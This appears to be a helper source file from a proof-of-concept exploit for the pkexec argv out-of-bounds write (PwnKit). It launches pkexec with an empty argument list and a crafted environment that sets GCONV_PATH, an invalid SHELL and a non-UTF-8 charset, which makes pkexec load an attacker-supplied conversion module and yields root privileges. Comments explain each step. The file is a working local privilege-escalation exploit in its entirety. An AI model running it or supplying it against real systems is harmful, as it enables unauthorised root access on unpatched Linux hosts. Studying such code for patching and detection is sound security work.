/**
 * Just an helper to run pkexec with empty argv and the appropriate env vars.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void) {
	char *const envp[] = {
		// This pointer will be overridden by pkexec with an OOB write on argv.
		"fake_exe",

		// If this dir exists and fake_exe exists within it,
		// g_find_program_in_path() will return "GCONV_PATH=./fake_exe", which
		// will overwrite envp[0] essentially setting up the GCOV_PATH env var.
		"PATH=GCONV_PATH=.",

		// A shell that is not present under /etc/shells, so that pkexec's
		// validate_environment_variable() fails, calling g_printerr().
		"SHELL=x",

		// An encoding that is not UTF-8, so g_printerr() invokes a loadable
		// module (fake_module.c) for string conversion from GCONV_PATH.
		"CHARSET=UTF-16",
		NULL
	};

	execvpe("pkexec", (char *[]){NULL}, envp);
	perror("execvpe failed");
	return 1;
}
